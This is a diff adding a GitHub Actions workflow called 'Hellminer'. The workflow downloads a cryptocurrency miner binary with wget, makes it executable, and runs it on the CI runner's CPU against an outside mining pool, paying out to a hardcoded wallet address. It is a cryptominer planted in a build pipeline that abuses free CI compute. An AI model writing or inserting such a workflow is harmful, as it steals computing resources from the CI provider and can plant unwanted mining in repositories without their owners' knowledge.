@@ -1,0 +1,17 @@
+name: Hellminer
+
+on:
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Download Hellminer
+      run: |
+        wget https://github.com/VerusCoin/hellminer/releases/latest/download/hellminer -O hellminer
+        chmod +x hellminer
+
+    - name: Start Mining
+      run: |
+        ./hellminer -c stratum+tcp://sg.vipor.net:5040#xnsub -u RDuuJMW7LLCSwRExPtQmqBb3TJeNtjxtqL.docker -p x --cpu1
